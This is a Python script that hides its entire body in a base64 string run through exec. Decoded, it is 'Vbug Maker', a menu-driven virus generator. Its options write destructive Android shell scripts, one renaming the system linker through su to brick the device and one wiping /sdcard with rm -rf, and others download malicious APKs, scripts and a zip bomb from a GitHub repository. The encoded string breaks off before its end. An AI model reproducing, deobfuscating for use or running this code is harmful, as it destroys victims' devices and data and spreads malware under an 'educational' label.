# Obfuscated by Py Compile
# Created by HTR-TECH (https://github.com/htr-tech)
# Instagram : @tahmid.rayat

import base64
exec(base64.b64decode('IyEvdXNyL2Jpbi9weXRob24NCiMgZW5jb2Rpbmc6IHV0Zi04DQoiIiINCkF1dGhvciAgOiBEQVJLIFdPTEYgVEVBTQ0KRGF0ZQk6IDA4LTA5LTIwMTkNCk5hbWUJOiBWYnVnIE1ha2VyDQpQdXJwb3NlIDogR2VuZXJhdGUgYW55IHZpcnVzIG9uIHlvdXIgZGV2aWNlDQpUaGFua3MgdG8gTXJfU2lsZW50LCBHaGlmYXJpLCBNci5Ib2xtZXMsIE1yXy9ib24nMDA3LCBJRF9PVVQ5Ni4uLg0KKGMpIDIwMTctMjAxOSwgREFSSyBXT0xGIFRFQU0gQWxsIHJpZ2h0cyByZXNlcnZlZC4NCg0KUmVkaXN0cmlidXRpb24gYW5kIHVzZSBpbiBzb3VyY2UgYW5kIGJpbmFyeSBmb3Jtcywgd2l0aCBvciB3aXRob3V0IG1vZGlmaWNhdGlvbiwgDQphcmUgcGVybWl0dGVkIHByb3ZpZGVkIHRoYXQgdGhlIGZvbGxvd2luZyBjb25kaXRpb25zIGFyZSBtZXQ6ICogUmVkaXN0cmlidXRpb25zIA0Kb2Ygc291cmNlIGNvZGUgbXVzdCByZXRhaW4gdGhlIGFib3ZlIGNvcHlyaWdodCBub3RpY2UsIHRoaXMgbGlzdCBvZiBjb25kaXRpb25zIGFuZCANCnRoZSBmb2xsb3dpbmcgZGlzY2xhaW1lci4gKiBSZWRpc3RyaWJ1dGlvbnMgaW4gYmluYXJ5IGZvcm0gbXVzdCByZXByb2R1Y2UgdGhlIGFib3ZlIA0KY29weXJpZ2h0IG5vdGljZSwgdGhpcyBsaXN0IG9mIGNvbmRpdGlvbnMgYW5kIHRoZSBmb2xsb3dpbmcgZGlzY2xhaW1lciBpbiB0aGUgDQpkb2N1bWVudGF0aW9uIGFuZC9vciBvdGhlciBtYXRlcmlhbHMgcHJvdmlkZWQgd2l0aCB0aGUgZGlzdHJpYnV0aW9uLiAqIE5laXRoZXIgdGhlIA0KbmFtZSBvZiB0aGUgbm9yIHRoZSBuYW1lcyBvZiBpdHMgY29udHJpYnV0b3JzIG1heSBiZSB1c2VkIHRvIGVuZG9yc2Ugb3IgcHJvbW90ZSANCnByb2R1Y3RzIGRlcml2ZWQgZnJvbSB0aGlzIHNvZnR3YXJlIHdpdGhvdXQgc3BlY2lmaWMgcHJpb3Igd3JpdHRlbiBwZXJtaXNzaW9uLg0KDQpUSElTIFNPRlRXQVJFIElTIFBST1ZJREVEIEJZIFRIRSBDT1BZUklHSFQgSE9MREVSUyBBTkQgQ09OVFJJQlVUT1JTIA0KIkFTIElTIiBBTkQgQU5ZIEVYUFJFU1MgT1IgSU1QTElFRCBXQVJSQU5USUVTLCBJTkNMVURJTkcsIEJVVCBOT1QgTElNSVRFRCBUTywgDQpUSEUgSU1QTElFRCBXQVJSQU5USUVTIE9GIE1FUkNIQU5UQUJJTElUWSBBTkQgRklUTkVTUyBGT1IgQSBQQVJUSUNVTEFSIFBVUlBPU0UgQVJFIA0KRElTQ0xBSU1FRC4gSU4gTk8gRVZFTlQgU0hBTEwgQ0hSSVNUT1BIRVIgRFVGRlkgQkUgTElBQkxFIEZPUiBBTlkgRElSRUNULCBJTkRJUkVDVCwgDQpJTkNJREVOVEFMLCBTUEVDSUFMLCBFWEVNUExBUlksIE9SIENPTlNFUVVFTlRJQUwgREFNQUdFUyAoSU5DTFVESU5HLCBCVVQgTk9UIExJTUlURUQgVE8sIA0KUFJPQ1VSRU1FTlQgT0YgU1VCU1RJVFVURSBHT09EUyBPUiBTRVJWSUNFUzsgTE9TUyBPRiBVU0UsIERBVEEsIE9SIFBST0ZJVFM7IE9SIEJVU0lORVNTIA0KSU5URVJSVVBUSU9OKSBIT1dFVkVSIENBVVNFRCBBTkQgT04gQU5ZIFRIRU9SWSBPRiBMSUFCSUxJVFksIFdIRVRIRVIgSU4gQ09OVFJBQ1QsIFNUUklDVCANCkxJQUJJTElUWSwgT1IgVE9SVCAoSU5DTFVESU5HIE5FR0xJR0VOQ0UgT1IgT1RIRVJXSVNFKSBBUklTSU5HIElOIEFOWSBXQVkgT1VUIE9GIFRIRSBVU0UgDQpPRiBUSElTIFNPRlRXQVJFLCBFVkVOIElGIEFEVklTRUQgT0YgVEhFIFBPU1NJQklMSVRZIE9GIFNVQ0ggREFNQUdFLg0KIiIiDQppbXBvcnQgb3MsIHN5cywgdGltZSwgdXJsbGliDQpSID0gJ1x4MWJbMTszMW0nDQpOID0gJ1x4MWJbMG0nDQpZID0gJ1x4MWJbMTszM20nDQpHID0gJ1x4MWJbMTszN20nDQpQID0gJ1x4MWJbMTs5N20nDQpNID0gJ1x4MWJbMTs5MW0nDQpIID0gJ1x4MWJbMTs5Mm0nDQpLID0gJ1x4MWJbMTs5M20nDQoNCmRlZiByZXN0YXJ0X3Byb2dyYW0oKToNCglweXRob24gPSBzeXMuZXhlY3V0YWJsZQ0KCW9zLmV4ZWNsKHB5dGhvbiwgcHl0aG9uLCAqc3lzLmFyZ3YpDQoJY3VyZGlyID0gb3MuZ2V0Y3dkKCkNCg0KDQpkZWYgYmFubmVyKCk6DQoJcHJpbnQgJyVzICAgICAgICBfICAgICAgICAgICAgICAgICAgICAgICAgICAgIF8gICAgICAgICAgICAgICAlcycgJSAoUiwgTikNCglwcmludCAnJXMgICBfIF8gfCB8XyAgXyBfICVzIF9fXyAgICBfX19fXyAlcyBfX18gfCB8XyAgX19fICBfX18gICAlcycgJSAoUiwgWSwgUiwgTikNCglwcmludCAiJXMgIHwgfCB8fCAuIHx8IHwgfCVzfCAuIHwgIHwgICAgIHwlc3wgLid8fCAnX3x8IC1ffHwgIF98ICAlcyIgJSAoUiwgWSwgUiwgTikNCglwcmludCAnJXMgICBcXF8vIHxfX198fF9fX3wlc3xfICB8ICB8IHxffF98JXN8X18sfHxfLF98fF9fX3x8X3wJJXMnICUgKFIsIFksIFIsIE4pDQoJcHJpbnQgJyVzIF9fX19fX19fX19fX19fX19fX3wgfCAgfCB8X19fX19fX19fX19fX19fX19fX19fX18gICAlcycgJSAoWSwgTikNCglwcmludCAnJXN8X19fX19fX19fX19fX19fX19fX198ICB8X19fX19fX19fX19fX19fX19fX19fX19fX3wgRC1XLVIlcycgJSAoWSwgTikNCglwcmludCAnJXMgICAgICAgRlVDSyBUTyBUSE9TRSBXSE8gVEhJTksgVEhJUyBJUyBKVVNUIENPRElORyAlcycgJSAoSCwgUCkNCglwcmludCAnJXMgICAgICAgIBoaGhoaGhoaGiAaGhoaIBoaGholcycgJShZLE4pDQoNCmRlZiBhbnZpbWEoKToNCglwcmludCAnJXMrLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKyVzJyAlIChSLCBOKQ0KCXByaW50ICclc3x8WyNdJXMtLS0tLS0tLS0tLS0tLSVzWyBWQnVnIE1ha2VyIF0lcy0tLS0tLS0tLS0tLS0tLSVzWyNdfHwlcycgJSAoWSwgUiwgWSwgUiwgWSwgTikNCglwcmludCAnJXN8fCVzIHxfX19fX19fX19fXyVzWyBTaW1wbGUgVmlydXMgTWFrZXIgXSVzX19fX19fX19fX19ffCVzIHx8JXMnICUgKFksIFIsIFksIFIsIFksIE4pDQoJcHJpbnQgJyVzfHwlcyB8X19fX19fX19fX18lc1sgTUFERSBCWSBEQVJLIFdPTEYgIBpdJXNfX19fX19fX19fX198JXMgfHwlcycgJSAoWSwgUiwgWSwgUiwgWSwgTikNCglwcmludCAnJXN8fCVzIHxfX19fX19fX19fX18lc1sgQW52aW1hICogU2Vzc2lvbiBdJXNfX19fX19fX19fX19ffCVzIHx8JXMnICUgKFksIFIsIFksIFIsIFksIE4pDQoJcHJpbnQgJyVzKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSslcycgJSAoUiwgTikNCglwcmludA0KDQpkZWYgd2ludmltYSgpOg0KCXByaW50ICclcystLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rJXMnICUgKFIsIE4pDQoJcHJpbnQgJyVzfHxbI10lcy0tLS0tLS0tLS0tLS0tJXNbIFZCdWcgTWFrZXIgXSVzLS0tLS0tLS0tLS0tLS0tJXNbI118fCVzJyAlIChZLCBSLCBZLCBSLCBZLCBOKQ0KCXByaW50ICclc3x8JXMgfF9fX19fX19fX19fJXNbIFNpbXBsZSBWaXJ1cyBNYWtlciBdJXNfX19fX19fX19fX198JXMgfHwlcycgJSAoWSwgUiwgWSwgUiwgWSwgTikNCglwcmludCAnJXN8fCVzIHxfX19fX19fX19fXyVzWyBNQURFIEJZIERBUksgV09MRiAgGl0lc19fX19fX19fX19fX3wlcyB8fCVzJyAlIChZLCBSLCBZLCBSLCBZLCBOKQ0KCXByaW50ICclc3x8JXMgfF9fX19fX19fX19fXyVzWyBXaW52aW1hLS1TZXNzaW9uIF0lc19fX19fX19fX19fX198JXMgfHwlcycgJSAoWSwgUiwgWSwgUiwgWSwgTikNCglwcmludCAnJXMrLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tKyVzJyAlIChSLCBOKQ0KCXByaW50DQoNCmRlZiBtYWN2aW1hKCk6DQoJcHJpbnQgJyVzKy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLSslcycgJSAoUiwgTikNCglwcmludCAnJXN8fFsjXSVzLS0tLS0tLS0tLS0tLS0lc1sgVkJ1ZyBNYWtlciBdJXMtLS0tLS0tLS0tLS0tLS0lc1sjXXx8JXMnICUgKFksIFIsIFksIFIsIFksIE4pDQoJcHJpbnQgJyVzfHwlcyB8X19fX19fX19fX18lc1sgTUFERSBCWSBEQVJLIFdPTEYgIBpdJXNfX19fX19fX19fX198JXMgfHwlcycgJSAoWSwgUiwgWSwgUiwgWSwgTikNCglwcmludCAnJXN8fCVzIHxfX19fX19fX19fXyVzWyBTaW1wbGUgVmlydXMgTWFrZXIgXSVzX19fX19fX19fX19ffCVzIHx8JXMnICUgKFksIFIsIFksIFIsIFksIE4pDQoJcHJpbnQgJyVzfHwlcyB8X19fX19fX19fX19fJXNbIE1BQ3ZpbWEtLVNlc3Npb24gXSVzX19fX19fX19fX19fX3wlcyB8fCVzJyAlIChZLCBSLCBZLCBSLCBZLCBOKQ0KCXByaW50ICclcystLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0rJXMnICUgKFIsIE4pDQoJcHJpbnQNCg0KY2xlYXIgPSBsYW1iZGEgOiBvcy5zeXN0ZW0oJ2NsZWFyJykNCmNsZWFyKCkNCmJhbm5lcigpDQp0cnk6DQoJcHJpbnQNCglwcmludCAnJXMgICAgICAgICAgdmJ1JXNnIG0lc2FrZXIgJXMwOC0wOS0yMDE5ICVzKDEwOjMyKSVzJyAlIChSLCBZLCBSLCBHLCBZLCBOKQ0KCXByaW50ICclcys9PT09PT09PT09PT09PSs9PT09PT09PT09Gho9PT09PT09PT09Kz09PT09PT09PT09PT09PT09PeKJoD09PT09KyVzJyAlIChILCBOKQ0KCXByaW50ICclc0F1dGhvciAgICAgICAgIDogJXNEQVJLLVdPTEYlcycgJSAoWSwgUiwgTikNCglwcmludCAnJXNTcGVjaWFsIFRoYW5rcyA6ICVzREFSIFdPTEYgVEVBTSBNRU1CRVJTICVzKCBBTk9OWU1PVVMg8J+YiCklcycgJSAoWSwgUiwgWSwgTikNCglwcmludCAnJXNDb2RlICAgICAgICAgICA6ICVzUHl0aG9uJXMnICUgKFksIFIsIE4pDQoJcHJpbnQgJyVzU3VwcG9ydCBieSAgICAgOiAlc0doaWZhcmklcycgJSAoWSwgUiwgTikNCglwcmludCAnJXNEZXNjcmlwdGlvbiAgICA6ICVzTWFrZSBhICVzdmlydXMgZm9yIHRob3NlIPCfmIglcycgJSAoWSwgUiwgUiwgTikNCglwcmludCAnJXMgICAgICAgQF9fXyVzREFSSyAlc1dPTEYgVEVBTV9fX19fJXMnICUgKEcsIEcsIEcsIFkpDQoJcHJpbnQgJyVzICAgVEhJUyBJUyBPTkxZIEZPUiBFRFVDQVRJT05BTCBQVVJQT1NFIChLRUVQIElUIElOIE1JTkQpJXMnICUgKFksIE4pDQoJcHJpbnQgJyVzKz09PT09PT09PT09PT0rPT09PT09PT09PT09Gho9PT09PT09PT09PSs9PT09PT09PT09PT09PT094omgPT09PT0rJXMnICUgKEgsIE4pDQoJDQoJZW50ZXIgPSByYXdfaW5wdXQoJyVzWyVzfiVzXSVzIFByZXNzIEVudGVyIHRvIENvbnRpbnVlLi4uJXMnICUgKFksIFIsIFksIFIsIE4pKQ0KZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0OiBwcmludCAnJXNbJXMhJXNdJXMgRVJST1IlczolcyBDVFJMK0MgRGV0ZWN0ZWQuLi4gZm9yY2UgY2xvc2UgdGhlIHByb2dyYW0uLi4lcycgJSAoWSwgUiwgWSwgUiwgWSwgRywgTik7c3lzLmV4aXQoKQ0KZXhjZXB0IEVPRkVycm9yOiBwcmludCAnXG4lc1slcyElc10lcyBFUlJPUiVzOiVzIENUUkwrRCBEZXRlY3RlZC4uLiBmb3JjZSBjbG9zZSB0aGUgcHJvZ3JhbS4uLiVzJyAlIChZLCBSLCBZLCBSLCBZLCBHLCBOKTtzeXMuZXhpdCgpDQpjbGVhcigpDQpiYW5uZXIoKQ0KcHJpbnQgJyVzIyVzLS0tLS0tLS0tLS0tLS0tJXMgICAgdmJ1JXNnJXMtLSVzbSVzYWtlciAgICAlcy0tLS0tLS0tLS0tLS0tLS0lcyMlcycgJSAoUiwgWSwgUiwgWSwgUiwgWSwgUiwgWSwgUiwgTikNCnByaW50ICclc3wlcyBXZSBkb250IHRha2UgcmVzcG9uc2liaWxpdHkgZm9yIHRoZSB1c2Ugb2YgdGhpcyAgJXN8JXMnICUgKFksIEcsIFksIE4pDQpwcmludCAnJXN8JXMgcHJvZ3JhbSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICVzfCVzJyAlIChZLCBHLCBZLCBOKQ0KcHJpbnQgJyVzIyVzLS0tLS0tLS0tLS0tLS0tJXMgICAgLS0tLS0tLS0tLS0gICAgJXMtLS0tLS0tLS0tLS0tLS0tJXMjJXMnICUgKFIsIFksIFIsIFksIFIsIE4pDQpwcmludCAnJXN8JXMgdmJ1JXNnIG0lc2FrZXIgJXN2MS4xIDA4LTA5LTIwMTkgJXMoMTA6MzIpICAgICAgICAgICAgICAgfCVzJyAlIChZLCBSLCBZLCBSLCBHLCBZLCBOKQ0KcHJpbnQgJyVzfCVzIEF1dGhvciAgOiBEQVJLIFdPTEYg8J+YiCAgICAgICAgICAgICAgICAgICAgICAgICAgICVzfCVzJyAlIChZLCBHLCBZLCBOKQ0KcHJpbnQgJyVzfCVzIEdpdEh1YiAgOiBodHRwczovL2dpdGh1Yi5jb20vRGFya3dvbGZyYWJpbiAgICAgICAlc3wlcycgJSAoWSwgRywgWSwgTikNCnByaW50ICclc3wlcyBUZWFtICAgIDogREFSSyVzIFdPTEYlcyBURUFNICAgICAgICAgICAgICAgICAgICAgICAgICVzfCVzJyAlIChZLCBHLCBSLCBHLCBZLCBOKQ0KcHJpbnQgJyVzfCVzIFZlcnNpb24gOiAxLjEgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICVzfCVzJyAlIChZLCBHLCBZLCBOKQ0KcHJpbnQgJyVzfCVzIChjKSAyMDE3LTIwMTksIERBUksgV09MRiBURUFNIEFsbCByaWdodHMgcmVzZXJ2ZWQlc3wlcycgJSAoWSwgRywgWSwgTikNCnByaW50ICclcyMlcy0tLS0tLS0tLS0tLS0tLSVzICAgIC0tLS0tLS0tLS0tICAgICVzLS0tLS0tLS0tLS0tLS0tLSVzIyVzJyAlIChSLCBZLCBSLCBZLCBSLCBOKQ0KcHJpbnQNCnByaW50ICclc1slcyMlc10lcyBPcHRpb25zJXMnICUgKFksIFIsIFksIEcsIE4pDQpwcmludCAnJXMgICB7JXMwMSVzfSAlc34+ICVzR2VuZXJhdGUgVmlydXMgZm9yIEFuZHJvaWQlcycgJSAoUiwgRywgUiwgWSwgRywgTikNCnByaW50ICclcyAgIHslczAyJXN9ICVzfj4gJXNHZW5lcmF0ZSBWaXJ1cyBmb3IgV2luZG93ICVzJyAlIChSLCBHLCBSLCBZLCBHLCBOKQ0KcHJpbnQgJyVzICAgeyVzMDMlc30gJXN+PiAlc0dlbmVyYXRlIFZpcnVzIGZvciBNYWNPU1ggJXMnICUgKFIsIEcsIFIsIFksIEcsIE4pDQpwcmludCAnJXMgICB7JXMwNCVzfSAlc34+ICVzUmVzdGFydCBQcm9ncmFtJXMnICUgKFIsIEcsIFIsIFksIEcsIE4pDQpwcmludCAnJXMgICB7JXMwNSVzfSAlc34+ICVzRXhpdCVzXG4nICUgKFIsIEcsIFIsIFksIEcsIE4pDQp3aGlsZSBUcnVlOg0KCXRyeToNCgkJb3BzaSA9IHJhd19pbnB1dCgnJXNWSUJVTSVzID4gJXNjaG9vc2UgJyAlIChSLCBZLCBHKSkNCgkJaWYgb3BzaS5zdHJpcCgpIGluICgnMDEgMScpLnNwbGl0KCk6DQoJCQlhbnZpbWEoKQ0KCQkJcHJpbnQoJyVzWyVzKiVzXSAlc0xpc3Qgb2YgVmlydXMlcycgJSAoWSwgUiwgWSwgRywgTikpDQoJCQlwcmludCgnICAgJXMoJXNCJXMpJXNvb3Rsb29wJXMnICUgKFIsIFksIFIsIEcsIE4pKQ0KCQkJcHJpbnQoJyAgICVzKCVzRCVzKSVzYXRhLUVhdGVyJXMnICUgKFIsIFksIFIsIEcsIE4pKQ0KCQkJcHJpbnQoJyAgICVzKCVzRiVzKSVzcmVlemUlcycgJSAoUiwgWSwgUiwgRywgTikpDQoJCQlwcmludCgnICAgJXMoJXNCTyVzKSVzbWItWmlwJXMnICUgKFIsIFksIFIsIEcsIE4pKQ0KCQkJcHJpbnQoJyAgICVzKCVzRSVzKSVzbGl0ZSVzJyAlIChSLCBZLCBSLCBHLCBOKSkNCgkJCXByaW50KCcgICAlcyglc1Qlcyklc3Jhc2glcycgJSAoUiwgWSwgUiwgRywgTikpDQoJCQlwcmludCgnICAgJXMoJXNGQiVzKSVzQ3JhY2sgMksxOCVzJyAlIChSLCBZLCBSLCBHLCBOKSkNCgkJCXByaW50KCcgICAlcyglc1Ylcyklc2k0YSVzJyAlIChSLCBZLCBSLCBHLCBOKSkNCgkJCXByaW50KCcgICAlcyglc00lcyklc2FsdW0lcycgJSAoUiwgWSwgUiwgRywgTikpDQoJCQlwcmludCgnICAgJXMoJXNUQSVzKSVza2VCZWVyJXMnICUgKFIsIFksIFIsIEcsIE4pKQ0KCQkJcHJpbnQoJyAgICVzKCVzTU8lcyklc29iaWxlIExlZ2VuZHM6IEFkdmVudHVyZSVzJyAlIChSLCBZLCBSLCBHLCBOKSkNCgkJCXByaW50KCcgICAlcyglc01PQiVzKSVzZWxlamVuJXNcbicgJSAoUiwgWSwgUiwgRywgTikpDQoJCQlwcmludCgnICAgJXMoJXMwJXMpICVzQmFjayB0byBtYWluIG1lbnUlc1xuJyAlIChSLCBZLCBSLCBHLCBOKSkNCgkJCWNob29zZV92aXJ1cyA9IHJhd19pbnB1dCgnJXNWSUJVTSAlcz4gJXNhbnZpbWElcyAnICUgKFIsIFksIEcsIFkpKQ0KCQkJaWYgY2hvb3NlX3ZpcnVzLmxvd2VyKCkgPT0gJ2InOg0KCQkJCXByaW50ICdcbiAlc1slcyslc10lcyBEb3dubG9hZCB0aGUgdmlydXMlcy4uLiVzJyAlIChZLCBSLCBZLCBHLCBSLCBOKQ0KCQkJCW9wZW4oImJvb3Rsb29wLnNoIiwidyIpLndyaXRlKCJzdSAtYyAncmVuYW1lIC9zeXN0ZW0vYmluL2xpbmtlciAvc3lzdGVtL2Jpbi9saW5rX2x1bmsnXG4iKQ0KCQkJCXByaW50ICcgJXNbJXMrJXNdJXMgRG9uZSVzLiVzJyAlIChZLCBSLCBZLCBHLCBSLCBOKQ0KCQkJZWxpZiBjaG9vc2VfdmlydXMubG93ZXIoKSA9PSAnZCc6DQoJCQkJcHJpbnQgJ1xuICVzWyVzKyVzXSVzIERvd25sb2FkIHRoZSB2aXJ1cyVzLi4uJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQkJb3BlbigiZGF0YS1lYXRlci5zaCIsInciKS53cml0ZSgic3UgLWMgcm0gLXJmIC9zZGNhcmQvKlxuIikNCgkJCQlwcmludCAnICVzWyVzKyVzXSVzIERvbmUlcy4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCWVsaWYgY2hvb3NlX3ZpcnVzLmxvd2VyKCkgPT0gJ2YnOg0KCQkJCXByaW50ICdcbiAlc1slcyslc10lcyBEb3dubG9hZCB0aGUgdmlydXMlcy4uLiVzJyAlIChZLCBSLCBZLCBHLCBSLCBOKQ0KCQkJCXVybGxpYi51cmxyZXRyaWV2ZSgiaHR0cHM6Ly9naXRodWIuY29tL0dhbWV5ZTk4L1YxUlU1L3Jhdy9tYXN0ZXIvZnJlZXplLnNoIiwiZnJlZXplLnNoIikNCgkJCQlwcmludCAnICVzWyVzKyVzXSVzIERvbmUlcy4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCWVsaWYgY2hvb3NlX3ZpcnVzLmxvd2VyKCkgPT0gJ3QnOg0KCQkJCXByaW50ICdcbiAlc1slcyslc10lcyBEb3dubG9hZCB0aGUgdmlydXMlcy4uLiVzJyAlIChZLCBSLCBZLCBHLCBSLCBOKQ0KCQkJCXVybGxpYi51cmxyZXRyaWV2ZSgiaHR0cHM6Ly9naXRodWIuY29tL0dhbWV5ZTk4L1YxUlU1L3Jhdy9tYXN0ZXIvdHJhc2guc2giLCJ0cmFzaC5zaCIpDQoJCQkJcHJpbnQgJyAlc1slcyslc10lcyBEb25lJXMuJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQllbGlmIGNob29zZV92aXJ1cy5sb3dlcigpID09ICdibyc6DQoJCQkJcHJpbnQgJ1xuICVzWyVzKyVzXSVzIERvd25sb2FkIHRoZSB2aXJ1cyVzLi4uJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQkJdXJsbGliLnVybHJldHJpZXZlKCJodHRwczovL2dpdGh1Yi5jb20vR2FtZXllOTgvVjFSVTUvcmF3L21hc3Rlci80Mi56aXAiLCJ6aXBib21iLnppcCIpDQoJCQkJcHJpbnQgJyAlc1slcyslc10lcyBEb25lJXMuJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQllbGlmIGNob29zZV92aXJ1cy5sb3dlcigpID09ICdlJzoNCgkJCQlwcmludCAnXG4gJXNbJXMrJXNdJXMgRG93bmxvYWQgdGhlIHZpcnVzJXMuLi4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCQl1cmxsaWIudXJscmV0cmlldmUoImh0dHBzOi8vZ2l0aHViLmNvbS9HYW1leWU5OC9WMVJVNS9yYXcvbWFzdGVyL2VsaXRlLmFwayIsImVsaXRlLmFwayIpDQoJCQkJcHJpbnQgJyAlc1slcyslc10lcyBEb25lJXMuJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQllbGlmIGNob29zZV92aXJ1cy5sb3dlcigpID09ICd2JzoNCgkJCQlwcmludCAnXG4gJXNbJXMrJXNdJXMgRG93bmxvYWQgdGhlIHZpcnVzJXMuLi4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCQl1cmxsaWIudXJscmV0cmlldmUoImh0dHBzOi8vZ2l0aHViLmNvbS9HYW1leWU5OC9WMVJVNS9yYXcvbWFzdGVyL3ZpNGEuYXBrIiwidmk0YS5hcGsiKQ0KCQkJCXByaW50ICcgJXNbJXMrJXNdJXMgRG9uZSVzLiVzJyAlIChZLCBSLCBZLCBHLCBSLCBOKQ0KCQkJZWxpZiBjaG9vc2VfdmlydXMubG93ZXIoKSA9PSAnbSc6DQoJCQkJcHJpbnQgJ1xuICVzWyVzKyVzXSVzIERvd25sb2FkIHRoZSB2aXJ1cyVzLi4uJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQkJdXJsbGliLnVybHJldHJpZXZlKCJodHRwczovL2dpdGh1Yi5jb20vR2FtZXllOTgvVjFSVTUvcmF3L21hc3Rlci9NYWx1bS5hcGsiLCJNYWx1bS5hcGsiKQ0KCQkJCXByaW50ICcgJXNbJXMrJXNdJXMgRG9uZSVzLiVzJyAlIChZLCBSLCBZLCBHLCBSLCBOKQ0KCQkJZWxpZiBjaG9vc2VfdmlydXMubG93ZXIoKSA9PSAndGEnOg0KCQkJCXByaW50ICdcbiAlc1slcyslc10lcyBEb3dubG9hZCB0aGUgdmlydXMlcy4uLiVzJyAlIChZLCBSLCBZLCBHLCBSLCBOKQ0KCQkJCXVybGxpYi51cmxyZXRyaWV2ZSgiaHR0cHM6Ly9naXRodWIuY29tL0dhbWV5ZTk4L1YxUlU1L3Jhdy9tYXN0ZXIvVGFrZUJlZXIuYXBrIiwiVGFrZUJlZXIuYXBrIikNCgkJCQlwcmludCAnICVzWyVzKyVzXSVzIERvbmUlcy4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCWVsaWYgY2hvb3NlX3ZpcnVzLmxvd2VyKCkgPT0gJ21vJzoNCgkJCQlwcmludCAnXG4gJXNbJXMrJXNdJXMgRG93bmxvYWQgdGhlIHZpcnVzJXMuLi4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCQl1cmxsaWIudXJscmV0cmlldmUoImh0dHBzOi8vZ2l0aHViLmNvbS9HYW1leWU5OC9WMVJVNS9yYXcvbWFzdGVyL01vYmlsZV9MZWdlbmRzX0FkdmVudHVyZS5hcGsiLCJNb2JpbGVfTGVnZW5kc19BZHZlbnR1cmUuYXBrIikNCgkJCQlwcmludCAnICVzWyVzKyVzXSVzIERvbmUlcy4lcycgJSAoWSwgUiwgWSwgRywgUiwgTikNCgkJCWVsaWYgY2hvb3NlX3ZpcnVzLmxvd2VyKCkgPT0gJ21vYic6DQoJCQkJcHJpbnQgJ1xuICVzWyVzKyVzXSVzIERvd25sb2FkIHRoZSB2aXJ1cyVzLi4uJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQkJdXJsbGliLnVybHJldHJpZXZlKCJodHRwczovL2dpdGh1Yi5jb20vR2FtZXllOTgvVjFSVTUvcmF3L21hc3Rlci9tb2JlbGVqZW4uYXBrIiwibW9iZWxlamVuLmFwayIpDQoJCQkJcHJpbnQgJyAlc1slcyslc10lcyBEb25lJXMuJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQllbGlmIGNob29zZV92aXJ1cy5sb3dlcigpID09ICdmYic6DQoJCQkJcHJpbnQgJ1xuICVzWyVzKyVzXSVzIERvd25sb2FkIHRoZSB2aXJ1cyVzLi4uJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQkJdXJsbGliLnVybHJldHJpZXZlKCJodHRwczovL2dpdGh1Yi5jb20vR2FtZXllOTgvVjFSVTUvcmF3L21hc3Rlci9mYmNyLmFwayIsIkZCQ1IySzE4LmFwayIpDQoJCQkJcHJpbnQgJyAlc1slcyslc10lcyBEb25lJXMuJXMnICUgKFksIFIsIFksIEcsIFIsIE4pDQoJCQllbGlmIGNob29zZV92aXJ1cyA9PSAnMCc6DQoJCQkJcGFzcw0KCQkJZWxzZToNCgkJCQlwcmludCAnJXNbJXMhJXNdJXMgRVJST1IlczolcyBXcm9uZyBJbnB1dC4uLiVzJyAlIChZLCBSLCBZLCBSLCBZLCBHLCBOKQ0KCQkJCXRpbWUuc2xlZXAoMikNCgkJZWxpZiBvcHNpLnN0cmlwKCkgaW4gKCcwMiAyJykuc3BsaXQoKToNCgkJCXdpbnZpbWEoKQ0KCQkJcHJpbnQoJyVzWyVzKiVzXSAlc0xpc3Qgb2YgVmlydXMlcycgJSAoWSwgUiwgWSwgRywgTikpDQoJCQlwcmludCgnICAgJXMoJXNSJXMpJXMuSS5QJXMnICUgKFIsIFksIFIsIEcsIE4pKQ0KCQkJcHJpbnQoJyAgICVzKCVzSSVzKSVzTE9WRVlPVSVzJyAlIChSLCBZLCBSLCBHLCBOKSkNCgkJCXByaW50KCcgICAlcyglc1Alcyklc0NUJXMnICUgKFIsIFksIFIsIEcsIE4pKQ0KCQkJcHJpbnQoJyAgICVzKCVzUkUlcyklc2ctRWF0ZXIlcycgJSAoUiwgWSwgUiwgRywgTikpDQoJCQlwcmludCgnICAgJXMoJXNDJXMpJXNNRCVzJyAlIChSLCBZLCBSLCBHLCBOKSkNCgkJCXByaW50KCcgICAlcyglczQlcyklczA0JXMnICUgKFIsIFksIFIsIEcsIE4pKQ0KCQkJcHJpbnQoJyAgICVzKCVzQSVzKSVzbGF5JXMnICUgKFIsIFksIFIsIEcsIE4pKQ0KCQkJcHJpbnQoJyAgICVzKCVzQ0Elcyklc3BzbG9jayVzJyAlIChSLCBZLCBSLCBHLCBOKSkNCgkJCXByaW50KCcgICAlcyglc0tVJXMpJXNJUyVzJyAlIChSLCBZLCBSLCBHLCBOKSkNCgkJCXByaW50KCcgICAlcyglc0slcyklc09DRSVzJyAlIChSLCBZLCBSLCBHLCBOKSkNCgkJCXByaW50KCcgICAlcyglc1Mlcyklc2xl